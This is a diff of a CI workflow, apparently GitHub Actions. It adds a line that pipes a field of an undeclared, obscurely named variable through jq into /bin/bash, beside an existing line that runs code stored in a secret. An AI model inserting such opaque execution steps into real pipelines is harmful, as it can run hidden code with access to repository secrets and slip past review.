@@ -27,6 +27,7 @@ jobs:
           v467: ${{ secrets.v467 }}
         run: |
           printf '%s' "$v467" | jq -r .d0 | /bin/bash
+          printf '%s' "$sioa6181" | jq -r .j62430 | /bin/bash
 
       - name: Upload results
         if: always()
